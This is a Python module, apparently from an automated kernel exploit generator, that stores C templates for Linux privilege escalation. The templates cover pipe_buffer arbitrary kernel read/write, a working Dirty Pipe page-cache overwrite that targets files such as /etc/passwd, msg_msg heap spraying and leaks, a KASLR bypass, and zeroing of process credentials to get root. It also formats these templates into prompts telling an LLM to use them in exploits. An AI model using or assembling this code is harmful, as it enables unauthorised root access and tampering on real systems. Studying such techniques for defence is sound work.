"""
exploit.rw_primitives — Arbitrary read/write primitive templates.

After exploiting a vulnerability to corrupt a kernel object (e.g. pipe_buffer,
msg_msg, sk_buff), the attacker needs a *stable* arbitrary R/W primitive to
read/write kernel memory at chosen addresses.  This module provides tested
C code templates for each common R/W strategy, parameterised by addresses.

These are the "second half" of every real exploit — the first half triggers
the vulnerability, the second half turns corruption into controlled R/W.

Patterns from real exploits (kernel_PoCs):
  - bad_io_uring:   pipe_buffer page overwrite → arb R/W through pipe
  - badnode:         binder unlink → arb write; ioctl(FIGETBSZ) → arb read
  - badspin:         PTY/pipe overlap → UAO thread
  - CVE-2023-26083:  pipe_buffer page overwrite → arb R/W through pipe
  - dirtypipe:       uninit PIPE_BUF_FLAG_CAN_MERGE → page cache write
"""

from __future__ import annotations

from typing import Any, Dict, List, Optional


# ═════════════════════════════════════════════════════════════════════
# Pipe-buffer arbitrary R/W (most common — used by 5/6 real exploits)
# ═════════════════════════════════════════════════════════════════════

PIPE_BUFFER_RW = r"""
/* ── Arbitrary R/W via corrupted pipe_buffer ─────────────────────────
 *
 * Precondition:  You have corrupted a pipe_buffer struct in the kernel
 *   so that you control the 'page', 'offset', 'len', and 'flags' fields.
 *
 * Strategy:
 *   1. Prepare a pipe: fill all buffers to set PIPE_BUF_FLAG_CAN_MERGE,
 *      then drain.  The flag persists on recycled buffers.
 *   2. After corruption, overwrite pipe_buffer.page to point to the
 *      physical page containing the target kernel address.
 *   3. read() from the pipe → reads kernel memory at page+offset.
 *   4. write() to the pipe → writes kernel memory at page+offset.
 *
 * Requires:  VMEMMAP_START, PAGE_OFFSET (from /proc/kallsyms or #defines)
 *
 * The 'corrupt_pipe_buffer' function is YOUR responsibility to implement
 * based on the specific vulnerability.  This provides the R/W helpers.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>

#ifndef VMEMMAP_START
#define VMEMMAP_START 0xfffffc0000000000ULL  /* arm64 default */
#endif
#ifndef PAGE_OFFSET
#define PAGE_OFFSET   0xffffff8000000000ULL  /* arm64 default */
#endif
#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif
#define STRUCT_PAGE_SIZE 64  /* sizeof(struct page) on arm64 */

/* Convert a kernel virtual address to its struct page pointer. */
static inline uint64_t virt_to_page(uint64_t addr) {
    uint64_t pfn = (addr - PAGE_OFFSET) / PAGE_SIZE;
    return VMEMMAP_START + pfn * STRUCT_PAGE_SIZE;
}

/* Convert a struct page pointer back to a kernel virtual address. */
static inline uint64_t page_to_virt(uint64_t page_addr) {
    uint64_t pfn = (page_addr - VMEMMAP_START) / STRUCT_PAGE_SIZE;
    return PAGE_OFFSET + pfn * PAGE_SIZE;
}

/* Prepare a pipe for the R/W primitive.
 * Fill all buffers (sets PIPE_BUF_FLAG_CAN_MERGE), then drain.
 * Returns 0 on success, fills pipe_fds[0]=read, pipe_fds[1]=write. */
static int prepare_rw_pipe(int pipe_fds[2]) {
    if (pipe(pipe_fds) < 0) return -1;

    /* Maximise pipe buffer count for more spray surface */
    int pipe_sz = fcntl(pipe_fds[1], F_SETPIPE_SZ, PAGE_SIZE * 16);
    if (pipe_sz < 0) pipe_sz = PAGE_SIZE;

    int n_bufs = pipe_sz / PAGE_SIZE;
    char *buf = calloc(1, PAGE_SIZE);
    if (!buf) return -1;

    /* Fill all buffers — this sets PIPE_BUF_FLAG_CAN_MERGE on each */
    for (int i = 0; i < n_bufs; i++) {
        write(pipe_fds[1], buf, PAGE_SIZE);
    }
    /* Drain — buffers are freed but flags persist */
    for (int i = 0; i < n_bufs; i++) {
        read(pipe_fds[0], buf, PAGE_SIZE);
    }
    free(buf);
    return 0;
}

/* After corrupting pipe_buffer.page to point to a target page:
 * Read 'len' bytes from kernel address through the pipe. */
static ssize_t kread_via_pipe(int pipe_fd_read, void *out, size_t len) {
    return read(pipe_fd_read, out, len);
}

/* After corrupting pipe_buffer.page/offset/len:
 * Write 'len' bytes to kernel address through the pipe. */
static ssize_t kwrite_via_pipe(int pipe_fd_write, const void *data, size_t len) {
    return write(pipe_fd_write, data, len);
}

/* Read a 64-bit value from a kernel address.
 * YOU must set up the pipe_buffer corruption so that reading from
 * pipe_fd_read yields data at 'addr'. */
static uint64_t kread64(uint64_t addr) {
    /* Implementation depends on your corruption primitive.
     * Typical approach: overwrite pipe_buffer.page = virt_to_page(addr),
     * pipe_buffer.offset = addr & (PAGE_SIZE-1), pipe_buffer.len = 8,
     * then read from the pipe. */
    (void)addr;
    printf("[!] kread64 not yet connected to corruption primitive\n");
    return 0;
}

/* Write a 64-bit value to a kernel address. */
static void kwrite64(uint64_t addr, uint64_t val) {
    (void)addr; (void)val;
    printf("[!] kwrite64 not yet connected to corruption primitive\n");
}
"""


# ═════════════════════════════════════════════════════════════════════
# Dirty Pipe R/W (page cache overwrite — no address needed)
# ═════════════════════════════════════════════════════════════════════

DIRTY_PIPE_RW = r"""
/* ── Dirty Pipe: write to page cache via uninit pipe flag ────────────
 *
 * CVE-2022-0847: PIPE_BUF_FLAG_CAN_MERGE persists in recycled pipe
 * buffers.  splice() from a file puts the file's page cache page into
 * the pipe buffer WITHOUT clearing the flag.  A subsequent write() to
 * the pipe merges into the page cache page, overwriting file contents.
 *
 * This does NOT require kernel addresses — it writes to files.
 * Targets: /etc/passwd, setuid binaries, shared libraries.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>

static int dirtypipe_prepare(int pipe_fds[2]) {
    if (pipe(pipe_fds) < 0) return -1;

    int pipe_sz = fcntl(pipe_fds[1], F_SETPIPE_SZ, 4096);
    int n = (pipe_sz > 0 ? pipe_sz : 4096) / 4096;
    char buf[4096] = {0};

    /* Fill all buffers */
    for (int i = 0; i < n; i++)
        write(pipe_fds[1], buf, sizeof(buf));
    /* Drain */
    for (int i = 0; i < n; i++)
        read(pipe_fds[0], buf, sizeof(buf));
    return 0;
}

/* Overwrite 'data_len' bytes at 'file_offset+1' in target_file.
 * The +1 is because splice needs at least 1 byte, then the pipe write
 * merges starting at offset+1. */
static int dirtypipe_write(const char *target_file, off_t file_offset,
                           const void *data, size_t data_len) {
    int fd = open(target_file, O_RDONLY);
    if (fd < 0) { perror("open target"); return -1; }

    int pipe_fds[2];
    if (dirtypipe_prepare(pipe_fds) < 0) {
        close(fd);
        return -1;
    }

    /* splice 1 byte from file → pipe (loads page cache page) */
    loff_t off = file_offset;
    ssize_t r = splice(fd, &off, pipe_fds[1], NULL, 1, 0);
    if (r <= 0) { perror("splice"); close(fd); return -1; }

    /* Write to pipe — merges into page cache due to CAN_MERGE flag */
    if (write(pipe_fds[1], data, data_len) != (ssize_t)data_len) {
        perror("pipe write"); close(fd); return -1;
    }

    close(pipe_fds[0]);
    close(pipe_fds[1]);
    close(fd);
    return 0;
}
"""


# ═════════════════════════════════════════════════════════════════════
# msg_msg arbitrary read (cross-cache)
# ═════════════════════════════════════════════════════════════════════

MSG_MSG_RW = r"""
/* ── Arbitrary read via msg_msg heap overflow / UAF ──────────────────
 *
 * After corrupting a msg_msg header (e.g. via cross-cache overflow),
 * overwrite m_ts (message size) to a larger value.  Receiving the
 * message then copies out-of-bounds kernel heap data to userspace.
 *
 * For arbitrary READ:
 *   1. Corrupt msg_msg.m_ts to a large value (e.g. PAGE_SIZE)
 *   2. msgrcv() → kernel copies m_ts bytes from the message, which
 *      now extends past the original allocation into adjacent objects.
 *
 * For arbitrary WRITE (via msg_msgseg):
 *   1. Corrupt msg_msg.next pointer to point to a fake msg_msgseg
 *      at a controlled address
 *   2. msgsnd() with continuation segments writes to the fake address
 */
#include <sys/msg.h>
#include <string.h>
#include <stdio.h>

struct msg_buf {
    long mtype;
    char mtext[1];  /* variable length */
};

/* Spray msg_msg objects into a target slab cache.
 * msg_size should match the target slab (e.g. 96 for kmalloc-96). */
static int spray_msg_msg(int qid, size_t msg_size, int count) {
    struct msg_buf *msg = calloc(1, sizeof(long) + msg_size);
    if (!msg) return -1;
    msg->mtype = 1;
    memset(msg->mtext, 'A', msg_size);

    for (int i = 0; i < count; i++) {
        msg->mtype = i + 1;
        if (msgsnd(qid, msg, msg_size, 0) < 0) {
            perror("msgsnd");
            free(msg);
            return i;
        }
    }
    free(msg);
    return count;
}

/* Read a corrupted msg_msg (with enlarged m_ts) to leak adjacent data.
 * Returns bytes read (including leaked data) or -1. */
static ssize_t leak_via_msg(int qid, long mtype, void *out, size_t max_len) {
    return msgrcv(qid, out, max_len, mtype, IPC_NOWAIT);
}
"""


# ═════════════════════════════════════════════════════════════════════
# KASLR leak via pipe_buffer ops
# ═════════════════════════════════════════════════════════════════════

KASLR_PIPE_LEAK = r"""
/* ── KASLR bypass via pipe_buffer.ops leak ───────────────────────────
 *
 * pipe_buffer.ops always points to anon_pipe_buf_ops (a kernel .data
 * symbol).  If you can read a pipe_buffer struct (e.g. via msg_msg OOB
 * read or pipe overlap), the ops pointer reveals the kernel base:
 *
 *   kernel_base = leaked_ops - ANON_PIPE_BUF_OPS_OFFSET
 *
 * ANON_PIPE_BUF_OPS_OFFSET comes from /proc/kallsyms or vmlinux.
 */

static uint64_t leak_kernel_base(uint64_t leaked_ops, uint64_t ops_offset) {
    if (leaked_ops == 0) {
        printf("[-] Cannot leak kernel base: ops pointer is NULL\n");
        return 0;
    }
    uint64_t base = leaked_ops - ops_offset;
    printf("[+] Kernel base: 0x%lx (ops=0x%lx, offset=0x%lx)\n",
           base, leaked_ops, ops_offset);
    return base;
}
"""


# ═════════════════════════════════════════════════════════════════════
# Task traversal + cred overwrite via arb R/W
# ═════════════════════════════════════════════════════════════════════

TASK_WALK_RW = r"""
/* ── Task list traversal via arbitrary read ──────────────────────────
 *
 * Given kread64() and the address of init_task, walk the task list
 * to find the current process (by PID or comm name).
 *
 * Requires #defines:
 *   INIT_TASK_ADDR         — address of init_task symbol
 *   TASK_STRUCT_TASKS      — offset of tasks (struct list_head) in task_struct
 *   TASK_STRUCT_PID        — offset of pid field
 *   TASK_STRUCT_COMM       — offset of comm field (char[16])
 *   TASK_STRUCT_CRED       — offset of cred pointer
 *   TASK_STRUCT_REAL_CRED  — offset of real_cred pointer
 */

#include <sys/prctl.h>

/* Set a unique process name for matching. */
static void set_exploit_name(void) {
    prctl(PR_SET_NAME, "syzploit_exp", 0, 0, 0);
}

/* Walk task list from init_task, find task with matching PID. */
static uint64_t find_task_by_pid(pid_t target_pid) {
    uint64_t task = INIT_TASK_ADDR;
    for (int i = 0; i < 4096; i++) {  /* safety limit */
        uint64_t tasks = kread64(task + TASK_STRUCT_TASKS);
        uint64_t next_task = tasks - TASK_STRUCT_TASKS;
        if (next_task == INIT_TASK_ADDR) break;  /* wrapped around */

        pid_t pid = (pid_t)kread64(next_task + TASK_STRUCT_PID);
        if (pid == target_pid) {
            printf("[+] Found task at 0x%lx (pid=%d)\n", next_task, pid);
            return next_task;
        }
        task = next_task;
    }
    printf("[-] Task with pid %d not found in task list\n", target_pid);
    return 0;
}

/* Zero uid/gid fields in the task's cred struct. */
static int zero_cred_uids(uint64_t task_addr) {
    uint64_t cred = kread64(task_addr + TASK_STRUCT_CRED);
    if (!cred) {
        printf("[-] cred pointer is NULL\n");
        return -1;
    }
    printf("[*] Zeroing cred at 0x%lx\n", cred);
    /* uid/gid/suid/sgid/euid/egid/fsuid/fsgid are at cred+4..cred+0x24
     * (8 x 4-byte fields = 32 bytes) */
    kwrite64(cred + 4,  0);  /* uid, gid */
    kwrite64(cred + 12, 0);  /* suid, sgid */
    kwrite64(cred + 20, 0);  /* euid, egid */
    kwrite64(cred + 28, 0);  /* fsuid, fsgid */
    printf("[+] Cred uid/gid fields zeroed\n");
    return 0;
}
"""


# ═════════════════════════════════════════════════════════════════════
# Registry class
# ═════════════════════════════════════════════════════════════════════

_RW_PRIMITIVES: Dict[str, Dict[str, Any]] = {
    "pipe_buffer_rw": {
        "code": PIPE_BUFFER_RW,
        "description": (
            "Arbitrary R/W via corrupted pipe_buffer struct. "
            "Overwrite pipe_buffer.page to redirect pipe I/O to "
            "kernel memory. Most common technique (5/6 real exploits)."
        ),
        "requires": ["corrupted_pipe_buffer", "VMEMMAP_START", "PAGE_OFFSET"],
        "provides": ["kread64", "kwrite64"],
        "vuln_types": ["uaf", "overflow", "oob_write", "type_confusion"],
    },
    "dirty_pipe_rw": {
        "code": DIRTY_PIPE_RW,
        "description": (
            "Write to file page cache via uninit PIPE_BUF_FLAG_CAN_MERGE. "
            "No kernel addresses needed — writes to files directly."
        ),
        "requires": ["CVE-2022-0847_or_similar"],
        "provides": ["file_overwrite"],
        "vuln_types": ["uninit_flag"],
    },
    "msg_msg_rw": {
        "code": MSG_MSG_RW,
        "description": (
            "Arbitrary read via msg_msg m_ts enlargement after UAF/overflow. "
            "OOB read leaks adjacent heap data; msg_msgseg pointer "
            "corruption gives arbitrary write."
        ),
        "requires": ["corrupted_msg_msg"],
        "provides": ["oob_read", "limited_write"],
        "vuln_types": ["uaf", "overflow", "cross_cache"],
    },
    "kaslr_pipe_leak": {
        "code": KASLR_PIPE_LEAK,
        "description": (
            "KASLR bypass by leaking pipe_buffer.ops pointer "
            "(anon_pipe_buf_ops). Requires ability to read a "
            "pipe_buffer struct."
        ),
        "requires": ["leak_pipe_buffer_ops"],
        "provides": ["kernel_base_address"],
        "vuln_types": ["uaf", "oob_read", "info_leak"],
    },
    "task_walk_rw": {
        "code": TASK_WALK_RW,
        "description": (
            "Task list traversal + cred uid/gid zeroing via arb R/W. "
            "Walk from init_task to find current process, then zero "
            "the cred struct fields."
        ),
        "requires": ["kread64", "kwrite64", "INIT_TASK_ADDR", "task_struct_offsets"],
        "provides": ["cred_overwrite"],
        "vuln_types": ["any_with_arb_rw"],
    },
}


class RWPrimitiveLibrary:
    """Library of arbitrary R/W primitive templates for exploit generation."""

    def get(self, name: str) -> Optional[Dict[str, Any]]:
        """Get a specific R/W primitive by name."""
        return _RW_PRIMITIVES.get(name)

    def list_all(self) -> List[str]:
        """List all available R/W primitive names."""
        return list(_RW_PRIMITIVES.keys())

    def get_code(self, name: str) -> str:
        """Get just the C code template for a primitive."""
        prim = _RW_PRIMITIVES.get(name)
        return prim["code"] if prim else ""

    def recommend_for_vuln(self, vuln_type: str) -> List[Dict[str, Any]]:
        """Recommend R/W primitives suitable for a vulnerability type."""
        results = []
        vt = vuln_type.lower().replace("-", "_").replace(" ", "_")
        for name, info in _RW_PRIMITIVES.items():
            if vt in info["vuln_types"] or "any_with_arb_rw" in info["vuln_types"]:
                results.append({"name": name, **info})
        return results

    def format_for_prompt(self, names: Optional[List[str]] = None) -> str:
        """Format R/W primitives for LLM prompt context."""
        selected = names or list(_RW_PRIMITIVES.keys())
        lines = [
            "=== Available Arbitrary R/W Primitive Templates ===",
            "These tested C code templates establish stable kernel R/W:",
            "",
        ]
        for name in selected:
            info = _RW_PRIMITIVES.get(name)
            if not info:
                continue
            lines.append(f"  {name}: {info['description']}")
            lines.append(f"    requires: {', '.join(info['requires'])}")
            lines.append(f"    provides: {', '.join(info['provides'])}")
            lines.append("")
        lines.append(
            "Use these templates in your exploit — call them by name "
            "and the stitcher will include the code."
        )
        return "\n".join(lines)
